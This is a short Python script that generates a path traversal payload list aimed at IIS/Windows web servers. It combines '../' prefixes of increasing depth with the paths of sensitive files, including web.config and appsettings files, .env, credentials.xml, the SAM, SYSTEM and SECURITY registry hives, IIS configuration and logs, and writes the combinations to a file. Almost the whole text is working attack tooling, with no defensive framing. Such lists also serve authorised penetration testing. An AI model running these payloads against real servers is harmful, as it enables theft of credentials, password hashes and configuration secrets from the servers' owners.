# Comprehensive list of sensitive files and directories on IIS/Windows systems
base_paths = [
    # Common web configuration and application settings
    "web.config", "Web.config", "web.config.bak", "web.config.old", "appsettings.json",
    "appsettings.Development.json", ".env", "applicationHost.config", "machine.config",
    "configprotectdata.config", "connections.config", "packages.config", "web.debug.config",
    "web.release.config", "local.settings.json", "credentials.xml", "secrets.xml",
    
    # IIS-specific and inetsrv files
    "WINDOWS/System32/inetsrv/config/schema.xml",
    "WINDOWS/System32/inetsrv/config/applicationHost.config",
    "WINDOWS/System32/inetsrv/config/redirection.config",
    "WINDOWS/System32/inetsrv/config/administration.config",
    "WINDOWS/System32/inetsrv/iisreset.exe",
    "WINDOWS/System32/inetsrv/iisapp.vbs",
    "WINDOWS/System32/inetsrv/appcmd.exe",
    
    # Host and SAM files
    "WINDOWS/system32/drivers/etc/hosts",
    "WINDOWS/system32/config/SAM",
    "WINDOWS/system32/config/SYSTEM",
    "WINDOWS/system32/config/SECURITY",

    # Event log files
    "WINDOWS/system32/config/AppEvent.Evt",
    "WINDOWS/system32/config/SecEvent.Evt",
    "WINDOWS/system32/config/SysEvent.Evt",

    # IIS logs and error directories
    "inetpub/logs/LogFiles/W3SVC1/u_exYYMMDD.log",
    "inetpub/logs/LogFiles/W3SVC1",
    "inetpub/temp/appPools",
    "inetpub/history",
    "inetpub/wwwroot/index.html",
    "WINDOWS/system32/logfiles/HTTPERR",
    "WINDOWS/system32/logfiles/W3SVC1",

    # Application source files
    "index.aspx", "Global.asax", "Startup.cs", "Program.cs", "default.aspx", "default.asp", "index.asp",
    "web.config.backup", "web.config.save", "web.config.save.bak",

    # Common sensitive programs and modules
    "Program Files/RSA Security/RSAWebAgent/WebID/web.config",
    "Program Files/IIS/",
    "Program Files/Common Files/Microsoft Shared/Web Server Extensions/14/LOGS",
    "Program Files/Common Files/Microsoft Shared/Web Server Extensions/15/LOGS",

    # Custom log paths from applicationHost.config
    "LogFiles/ttroot/app.log",
    "LogFiles/ttroot/errors.log",
    "Program File/RSA Security/RSAWebAgent/WebID/web.config"
]

# Traversal patterns (increasing depth)
traversal_prefixes = [
    "../", "../../", "../../../", "../../../../", "../../../../../",
    "/../", "/../../", "/../../../", "/../../../../", "/../../../../../"
]

# Generate combinations
payloads = [f"{prefix}{path}" for prefix in traversal_prefixes for path in base_paths]

# Save to file
file_path = "full_iis_path_traversal_payloads.txt"
with open(file_path, "w") as f:
    f.write("\n".join(payloads))

file_path
